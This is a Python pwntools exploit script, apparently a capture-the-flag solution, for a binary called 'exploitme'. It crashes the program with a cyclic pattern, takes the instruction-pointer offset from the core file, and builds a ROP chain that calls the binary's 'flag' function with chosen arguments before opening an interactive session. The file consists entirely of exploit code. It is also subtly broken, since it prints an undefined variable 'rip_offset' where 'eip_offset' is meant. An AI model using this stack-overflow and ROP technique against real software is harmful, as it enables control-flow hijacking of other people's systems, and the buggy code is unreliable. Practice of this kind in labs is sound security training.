# import ropper
from pwn import *
from pprint import pprint

elf = context.binary = ELF("./exploitme")
# context.log_level = "DEBUG"
# pprint(elf.symbols["_end"])

p = elf.process()
payload = cyclic(100)

p.sendline(payload)
p.wait()

corefile = p.corefile
# rsp_val = corefile.read(corefile.sp, 4)
eip_value = corefile.pc
eip_offset = cyclic_find(eip_value)


rop = ROP(elf)
param1 = 0xdeadbeef
param2 = 0xc0ded00d
target_func = elf.symbols["flag"]

rop.call(target_func, [param1, param2])
print(rip_offset)
payload = flat(
        {eip_offset: rop.chain()}
)

io = elf.process()
io.sendline(payload)

print(io.recvline())
io.interactive()


